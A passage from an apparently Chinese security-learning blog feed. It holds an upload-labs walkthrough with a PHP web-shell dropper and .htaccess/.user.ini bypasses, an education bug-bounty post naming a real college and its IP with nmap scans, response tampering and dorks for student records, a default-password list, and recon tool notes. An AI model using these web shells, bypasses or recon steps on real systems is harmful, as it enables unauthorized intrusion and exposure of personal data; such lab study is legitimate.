$temp_file 变量存储上传文件的临时文件路径。这个路径通常是服务器文件系统中的一个临时文件，可以在后续的处理中使用该路径。<br><strong>抓包修改:</strong><br>手动拦截1.php,将Content-Type的内容修改为image&#x2F;jpeg或者image&#x2F;png或者image&#x2F;gif<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704899189997-deeb0e84-1c79-458c-8fb9-0db8cff577c6.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704769555189-c907a763-712d-4924-ba30-35bc79391f76.png" alt="image.png"></p><h3 id="第三关-黑名单不完整-："><a href="#第三关-黑名单不完整-：" class="headerlink" title="第三关(黑名单不完整)："></a>第三关(黑名单不完整)：</h3><p>源码看一下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure><ol><li>$deny_ext &#x3D; array(‘.asp’,’.aspx’,’.php’,’.jsp’);<ul><li>定义一个名为 $deny_ext 的数组，包含了不允许的文件扩展名列表，例如 ‘.asp’、‘.aspx’、‘.php’、‘.jsp’。</li></ul></li><li>$file_name &#x3D; trim($_FILES[‘upload_file’][‘name’]);<ul><li>从 $_FILES 超全局数组中获取上传文件的原始文件名，并使用 trim() 函数去除文件名两端的空白字符，确保文件名没有额外的空格。</li></ul></li><li>$file_name &#x3D; deldot($file_name);<ul><li>使用 deldot() 函数删除文件名末尾的点，如果存在的话。这可能是一个自定义的函数，用于删除文件名末尾的点。</li></ul></li><li>$file_ext &#x3D; strrchr($file_name, ‘.’);<ul><li>使用 strrchr() 函数获取文件名中最后一个点（.）及其后的字符串，即文件扩展名，将结果赋值给变量 $file_ext。</li></ul></li><li>$file_ext &#x3D; strtolower($file_ext);<ul><li>使用 strtolower() 函数将文件扩展名转换为小写字母，以便后续比较的一致性。</li></ul></li><li>$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);<ul><li>使用 str_ireplace() 函数去除文件扩展名中的字符串 ‘::$DATA’，如果存在的话。这是为了防止一些特殊情况下可能出现的附加字符串。</li></ul></li><li>$file_ext &#x3D; trim($file_ext);<ul><li>使用 trim() 函数去除文件扩展名两端的空白字符，确保文件扩展名不包含额外的空格。</li></ul></li></ol><p>上传一个php5的脚本文件就可以绕过。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704782485963-2aeb19a8-53ad-4501-8517-a4e199f6b364.png" alt="image.png"></p><h3 id="第四关-黑名单验证-："><a href="#第四关-黑名单验证-：" class="headerlink" title="第四关(黑名单验证)："></a>第四关(黑名单验证)：</h3><p>第四关无法用小皮进行复现，但是可以用老版的phpstudy的复现，在apache的配置文件中httpd.conf，在文件中有这个模块。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704901177802-a4cac342-1b58-4ab9-9e40-beb414972675.png" alt="image.png"><br>在这个位置添加：AddType application&#x2F;x-httpd-php .php .phtml<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704965479524-f1f51360-b81e-45cd-9b09-f764c4a3597b.png" alt="image.png"><br>这里的.php .phtml表示如果后缀是.php .phtml这两个类型的文件可以解析为前面的php类型。<br><strong>介绍一下.htaccess文件是什么？</strong><br>.htaccess文件是一个分布式配置文件。这个文件可以存在与php网站的任何一个根目录当中，优先级远高于apache的配置文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40666686/1704973455404-643179be-89b0-42d1-8851-17936e800ce8.png#averageHue=%23fafaf8&clientId=ucebd50e6-aec3-4&from=paste&height=494&id=u4f2c5ea3&originHeight=618&originWidth=993&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=320618&status=done&style=none&taskId=uda7d6413-b888-4221-9bd3-e2d353cc0c7&title=&width=794.4" alt="image.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;3.jpg&quot;</span>&gt;<span class="comment">#之后上传的文件要以3.jpg命名</span></span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>1.先编写 .htaccess文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704782414704-f802ef22-d324-419e-b40f-493322aee46b.png" alt="fcc451f6fec3d99f02a9f6f03ff46da.png"><br>复制第四关文件内空的文件，在物理机上面粘贴并用viscode打开，写入以下你内容<br>&lt;FilesMatch “3.jpg”&gt;<br>SetHandler application&#x2F;x-httpd-php<br></FilesMatch><br>2.把  .htaccess 移到虚拟机桌面<br>3.再把木马重命名为3.jpg，用其他的名字也行，但是要保证与.htaccess写入的文件名保持一致。<br>4.先上传.htaccess文件，再上传3.jpg<br>5.复制3.jpg的图片链接<br>6.在链接后面输入?a&#x3D;dir<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704782402068-c6ac2331-ff6e-4239-9d93-f925246e529d.png" alt="image.png"></p><h3 id="第五关-黑名单绕过-user-ini-："><a href="#第五关-黑名单绕过-user-ini-：" class="headerlink" title="第五关(黑名单绕过:.user.ini)："></a>第五关(黑名单绕过:.user.ini)：</h3><p>首先查看文件根目录下存在一个helper.php的文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704974393545-3eaa366f-0757-4cc8-914e-e5a292b978ed.png" alt="image.png"><br>查看内容：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704974470028-5d179639-e6cf-4a99-b63d-1eab9d0b68f1.png" alt="image.png"><br>第五关的关键是要已知目录下存在的文件才能够利用，同时在网站根目录还要放一个phpinfo.php,这里将其命名为22.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于phpstudy的更新上述环境没有办法进行配置，可以从另一个配置文件.user.ini进行入手</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure><p>auto_prepend_file&#x3D;2.jpg这串代码的意思是说所有的php文件中都包含2.jpg，不过2.jpg是以源码的形式存在的<br>上传并访问2.jpg，就会包含源代码<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704976159451-cdabaff0-6153-48e8-8d38-9e689f5c1bb1.png" alt="image.png"><br>触发条件：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704976625554-44af6733-c8a3-4034-b534-5402aa336fc9.png" alt="89216d8a321185422afe0852c8684b9.png"><br>具体的含义就是说将.uer.ini上传到服务器之后每五分钟对2.jpg的内容直接写到php的文件当中，上传的是2.jpg的文件，上传之后就会每五分钟对当前目录下的php文件进行覆盖<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704977341060-352bce93-6c78-4598-b114-6d762473ecd2.png" alt="image.png"></p><h3 id="第六关-大小写绕过-："><a href="#第六关-大小写绕过-：" class="headerlink" title="第六关(大小写绕过)："></a>第六关(大小写绕过)：</h3><p>第六关源代码为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">  <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">  <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">  <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">  <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">  <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由代码可以看出将php等等内容加入了黑名单，windows系统可以尝试用全是大写绕过。<br>将6.php改成6.PHP5或者6.PHTML。上传就可以了。</p><h3 id="后续关卡的基本情况："><a href="#后续关卡的基本情况：" class="headerlink" title="后续关卡的基本情况："></a>后续关卡的基本情况：</h3><p>首先了解一下：<br>GIF89a是什么？<br>转换成二进制的情况下就是图片的头的前六位数字<br>JFIF开头是因为是png图片。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704978283906-076bf4fa-e2f5-406e-87e2-ab2df74836b1.png" alt="image.png"><br>GIF89a开头进行，如图所示<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704978482705-a31cf605-6023-4131-aaa9-7d907d7286b5.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704978977586-b6bb35a8-44b0-489b-955f-6b5984025011.png" alt="image.png"><br>一张特别大的图片，构造成上面是马下面是图片，截取的时候截掉图片，留下马就可以了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704979141094-38d7b6ae-2b2e-4978-8d4d-f3e4a9399acd.png" alt="image.png"><br>还有一种情况就是遇到比较差的服务器，一次上传一个木马可能不会成功，但是一次上传多个木马，在服务器未处理之前能够访问成功也是一种方法。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704979515539-e14d1ba2-a426-49e0-851f-82aaba1bb919.png" alt="image.png"></p><h3 id="第18关："><a href="#第18关：" class="headerlink" title="第18关："></a>第18关：</h3><p>新建一个木马为18.php,新生成的木马为p.php放在上一级目录之下<br>18.php称之为写码的码。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;../p.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @system($_GET[a]); ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传的整个流程是：<br>windows有个临时目录temp，先将文件上传之后存在temp目录之下，然后传送到服务器上面<br>服务器在删我们的马，我们也在不断的上传马，只要在服务器删文件之前访问成功马就会自动生成到上一级目录。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983924085-e0eac59b-bd21-46b3-ad97-afb0929d3150.png" alt="image.png"><br>实际操作：<br>打开yakit，打开内嵌浏览器，用浏览器打开upload的网址<br>随机上传一张图片，然后右键复制文件地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983077650-eae8c345-6f4d-4352-af05-1f4e7368ef60.png" alt="image.png"><br>并在浏览器上打开将图片名字改成18.php<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983257112-80cc25ec-8590-4cf4-88ce-18c37d268263.png" alt="image.png"><br>这个访问界面就是我们要去用yakit进行抓包获得一个get包<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983388114-e09017bb-c6bc-487e-a580-13411becc078.png" alt="image.png"><br>之后上传文件18.php会不允许我们上传，但是会获得一个post包<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983447971-ef659070-e50c-4916-b902-92f920a99798.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983406237-9ec71c20-ac5a-4e1e-9c4a-6a40c0364366.png" alt="image.png"><br>然后对这两个数据包分别重复发送999次，首先点击get包进行发送，之后点击post包进行发送然后看get包的状态码，200就是成功<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983562934-b6c5481c-605f-4150-8273-99824420983a.png" alt="image.png" style="zoom:33%;" /><br>之后去phpstudy的根目录下果真发现了p.php，此时注意p.php不是在upload目录下，而是在upload-labs-master目录之下。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983724422-4f9d0cab-0404-423b-b232-7d6a2cce2e72.png" alt="image.png"><br>之后在浏览器上面打开这个目录输入?a&#x3D;whoami就可以看到结果了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704983639175-18c27796-4e76-42d2-8174-1749a1da7a3c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教育SRC分析,弱口令漏洞</title>
      <link href="/2024/01/08/%E6%95%99%E8%82%B2SRC%E5%88%86%E6%9E%90-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/01/08/%E6%95%99%E8%82%B2SRC%E5%88%86%E6%9E%90-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="一-教育SRC分析"><a href="#一-教育SRC分析" class="headerlink" title="一.教育SRC分析"></a>一.教育SRC分析</h2><p>​       教育SRC的含义：教育SRC（Security Response Center，安全响应中心）是针对教育行业的一种网络安全实践。它主要是指一个组织或机构，专门负责收集、处理和响应网络安全相关的漏洞报告。在教育领域，许多学校和教育机构都设有自己的教育SRC，以便于管理和保护教育系统免受网络攻击和信息安全威胁。</p><h3 id="1-挖洞思路"><a href="#1-挖洞思路" class="headerlink" title="1,挖洞思路"></a>1,挖洞思路</h3><ul><li>教育SRC（学校）</li><li>公益SRC（白嫖）</li><li>挖漏洞（注入,逻辑漏洞,信息收集一下,子域名收集）</li><li>挖洞学校的漏洞（所有）——&gt;信息收集——&gt;学校</li><li>挖到某个学校的漏洞——&gt;学校——&gt;信息收集</li></ul><p>前提是首先保证能够挖到学校的漏洞之后才能去定向的去挖某个学校的漏洞。</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704636474903-99aac4bf-8d2b-4780-bdbe-6f6a144e3d52.png" alt="img"></p><h3 id="2-挖洞举例"><a href="#2-挖洞举例" class="headerlink" title="2.挖洞举例"></a>2.挖洞举例</h3><p>以西安医学院为例</p><p>1.谷歌搜索语法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:edu 学号</span><br><span class="line">inurl:edu 初始密码</span><br><span class="line">inurl:学号|身份证|电话|工号 filetype:pdf|xls|doc|xlxs</span><br></pre></td></tr></table></figure><p>2.搜索语句：domain&#x3D;”xiyi.edu.cn” 可以得到一些子域名和ip地址<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704640244107-d28bfa74-c841-4071-bb0e-d469758e1e18.png" alt="img">3.以及官网真实ip地址:59.75.117.2013.在kali用nmap扫描59.75.117.201，命令：nmap 59.75.117.201<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641100060-687dd459-8188-4ef4-a01a-e9259d06e006.png" alt="img">4.依次访问59.75.117.201：上图端口 如59.75.117.201：80 寻找漏洞5.任意用户注册，任意用户登录漏洞</p><p>(1)首先，先用一个正常手机号注册，正常填写手机号，验证码。随便填一个身份证号，登录，用Burp抓包<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704641738797-c8311a5a-71bb-419d-929e-2401dc987615.png" alt="img"></p><p>(2)然后，把返回的包记录下来<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704642213788-b105242f-4113-416e-8b55-8c0883af0367.png" alt="img"></p><p>{“success”:true}</p><p>(3)再随便注册一个手机号。手机号，验证码，身份证随便填<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704642532568-09c8e774-8925-4908-b306-c6af3de281cc.png" alt="img"></p><p>(4)再用Burp抓包，把下图中圈记的内容替换成之前记录的{“success”:true}<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704642756664-4698bcd9-f050-450e-b5f9-18c3dda33cec.png" alt="img">(5)发现直接可以注册登录了<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704642892657-98ee1896-409b-49a1-ae22-43d213f28d1c.png" alt="img"></p><h2 id="二-弱口令漏洞"><a href="#二-弱口令漏洞" class="headerlink" title="二.弱口令漏洞"></a>二.弱口令漏洞</h2><h3 id="为什么会出现弱口令"><a href="#为什么会出现弱口令" class="headerlink" title="为什么会出现弱口令"></a>为什么会出现弱口令</h3><p>弱口令漏洞是指系统登录口令的设置强度不高，容易被攻击者猜到或破解。造成弱口令漏洞的主要原因是系统的运维人员、管理人员安全意识不足。弱口令：弱口令我们可以简单的理解为能让别人随便就猜出的密码。</p><h3 id="弱口令进行猜测"><a href="#弱口令进行猜测" class="headerlink" title="弱口令进行猜测"></a>弱口令进行猜测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin/admin123</span><br><span class="line">admin/admin123456</span><br><span class="line">admin/123456</span><br><span class="line">admin/12345678</span><br><span class="line">admin/admin666</span><br><span class="line">admin/admin888</span><br></pre></td></tr></table></figure><p>通过fofa等等一些信息收集的工具能够去尝试发现更多的弱密码。</p><h2 id="三-提交平台"><a href="#三-提交平台" class="headerlink" title="三.提交平台"></a>三.提交平台</h2><p>1.教育漏洞报告平台,是专门为教育行业设计的在线系统，用于收集、管理和响应网络安全漏洞。链接：<a href="https://dev.src.sjtu.edu.cn/">https://dev.src.sjtu.edu.cn/</a></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704644015806-210ad2ee-d1e3-4c86-b0f7-151fe75e6585.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> src漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集域名解析,小米范的使用</title>
      <link href="/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90-%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/01/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90-%E5%B0%8F%E7%B1%B3%E8%8C%83%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="一-查找企业相关信息：企查查"><a href="#一-查找企业相关信息：企查查" class="headerlink" title="一.查找企业相关信息：企查查"></a>一.查找企业相关信息：企查查</h1><p>网址：<a href="https://www.qcc.com/">https://www.qcc.com/</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704530508814-9d879319-9e5c-41f8-a475-5034815dc63b.png" alt="image.png"><br>查找必须要进行注册：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704530741081-789fdfaa-4e44-433b-b313-a9aeff1c6424.png" alt="image.png"></p><h1 id="二-域名解析工具：dig和nslookup"><a href="#二-域名解析工具：dig和nslookup" class="headerlink" title="二.域名解析工具：dig和nslookup"></a>二.域名解析工具：dig和nslookup</h1><p>打开kali linux虚拟机，<strong>ping baidu.com</strong>会获得一个ip可能是CDN的IP，不确定。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704531516757-6660ad48-92f3-4373-90c9-5dcc15cd4c87.png" alt="image.png"><br><strong>dig qq.com</strong>#dig是DNS解析工具，可以查看记录<br>DNS：将域名解析为ip<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704531847834-3ffc0bc7-e99f-4b09-9a15-6fc73e4a753d.png" alt="image.png"><br><strong>nslookup qq.com</strong><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704531977157-55d88bdb-f8b0-4eb3-b829-b435d6ced287.png" alt="image.png"></p><h1 id="三-挖漏洞实用工具："><a href="#三-挖漏洞实用工具：" class="headerlink" title="三.挖漏洞实用工具："></a>三.挖漏洞实用工具：</h1><h2 id="1-优点"><a href="#1-优点" class="headerlink" title="1.优点:"></a>1.优点:</h2><p>OneForAll是一款集百家之长，功能强大的全面快速子域收集终极神器<br>综合性：OneForAll 整合了多个不同的子域名收集技术，包括基于搜索引擎的收集、基于字典的收集、基于证书透明度日志的收集等，可以综合收集各种来源的子域名信息。<br>高效性：OneForAll 的设计目标是高效快速地收集大量的子域名信息，可以帮助安全研究人员或渗透测试人员快速了解目标的整体情况。<br>开源性：OneForAll 是开源工具，用户可以自行进行定制和修改，适应自己的需求。</p><h2 id="2-oneforall下载与使用"><a href="#2-oneforall下载与使用" class="headerlink" title="2.oneforall下载与使用:"></a>2.oneforall下载与使用:</h2><p>可以调动很多网站的api<br>下载文件直接奉上:<a href="https://www.yuque.com/attachments/yuque/0/2024/zip/40666686/1704533662838-b8bd6bfe-ecda-4491-a41b-817958b5161f.zip?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2024/zip/40666686/1704533662838-b8bd6bfe-ecda-4491-a41b-817958b5161f.zip%22,%22name%22:%22OneForAll-0.4.5.zip%22,%22size%22:49316275,%22ext%22:%22zip%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u115d5778-44d6-44bf-81b5-cb1b23245b0%22,%22taskType%22:%22upload%22,%22type%22:%22application/x-zip-compressed%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u963211e6%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">OneForAll-0.4.5.zip</a><br>下载完成之后拖入虚拟机进行解压:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704533766341-e0b42254-ec96-4fb2-9bd1-f61e504d6257.png" alt="image.png"><br>源文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704534135714-011ad5fa-4272-4f88-9f78-38863947dce3.png" alt="image.png"><br>chmod 777 .&#x2F;*#赋予当前文件权限<br>python oneforall.py 缺少模块 fire<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704534548347-6769d3b5-376c-412e-a1fc-666f707d894e.png" alt="image.png"><br>pip intall fire<br>之后出现cannot import name ‘sre_parse’ from ‘re’<br>解决方案：<br><a href="https://www.cnblogs.com/mightnire/p/17609329.html">https://www.cnblogs.com/mightnire/p/17609329.html</a><br>最后结果疯狂报错。</p><h1 id="四-上传并检验病毒"><a href="#四-上传并检验病毒" class="headerlink" title="四.上传并检验病毒:"></a>四.上传并检验病毒:</h1><p>virustotal:<a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704532962191-9fdaae53-6e4d-4bc8-a461-5a2356dc105c.png" alt="image.png"><br>这个网站可以检测文件中是否存在病毒,但是效果不是很好,也可以看到其他相关信息和相关网站   .<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704533150808-36122d3a-b157-4de6-a24c-2afa87c1cee9.png" alt="image.png"></p><h1 id="五-渗透工具小米范"><a href="#五-渗透工具小米范" class="headerlink" title="五.渗透工具小米范"></a>五.渗透工具小米范</h1><h2 id="1-前提："><a href="#1-前提：" class="headerlink" title="1.前提："></a>1.前提：</h2><p>使用环境是在java1.8的环境中进行运行。</p><h2 id="2-下载："><a href="#2-下载：" class="headerlink" title="2.下载："></a>2.下载：</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar?_lake_card=%7B%22src%22:%22https://www.yuque.com/attachments/yuque/0/2024/jar/40666686/1704626940737-9ed7d2a5-72b6-4256-80fa-d2c1ee53ee10.jar%22,%22name%22:%22web_finder_2.9.jar%22,%22size%22:3556227,%22ext%22:%22jar%22,%22source%22:%22%22,%22status%22:%22done%22,%22download%22:true,%22taskId%22:%22u59eb5722-a048-4fbe-8215-d925d483331%22,%22taskType%22:%22upload%22,%22type%22:%22%22,%22__spacing%22:%22both%22,%22mode%22:%22title%22,%22id%22:%22u30fe1a6b%22,%22margin%22:%7B%22top%22:true,%22bottom%22:true%7D,%22card%22:%22file%22%7D">web_finder_2.9.jar</a>这是小米范的原文件。</p><h2 id="3-使用："><a href="#3-使用：" class="headerlink" title="3.使用："></a>3.使用：</h2><p>找到安装java1.8的安装路径，将web_finder_2.9.jar放入java1.8的bin目录之下。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704627348540-15136b93-127d-48ac-a9f7-e47ff0b19a15.png" alt="image.png"></p><p> 在java1.8的bin目录处输入cmd。<br>输入java -jar web_finder_2.9.jar，之后就可以启动你的小米范了。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704628134429-98c220db-0fa7-4916-a48e-9310d5a9aee4.png" alt="image.png"><br>之后新建扫描，输入IP就可以了，这里简单的输入了两个ip地址</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704628087611-e95403a7-5cfe-4511-bed5-0b0e331506ce.png" alt="image.png"><br>可以对表单中数据进行处理。</p><h2 id="4-举例："><a href="#4-举例：" class="headerlink" title="4.举例："></a>4.举例：</h2><p>fofa的使用：以sql-labs为例<br>用浏览器打开到sqli目录下查看网页源码，找到”POST- Dump into outfile - String”<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704628982805-1417eb29-526b-402d-b26a-dd5519bae253.png" alt="image.png"><br>用浏览器打开fofa使用body语法进行搜索。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704629236298-8194feb4-b524-4b02-9970-a88d58af241d.png" alt="image.png"><br>如果是会员可以进行下载称之为多元组数据。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704629410601-69fa40c9-14eb-45b9-9ac6-c2e0b9e0ec9c.png" alt="image.png"><br>直接右键将ip进行复制粘贴到小米范查看ip的存活情况。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704629494714-904c6d8a-c7c4-4efb-bfef-47db25cd86a3.png" alt="image.png"><br>全塞入这里进行扫描：<br><img 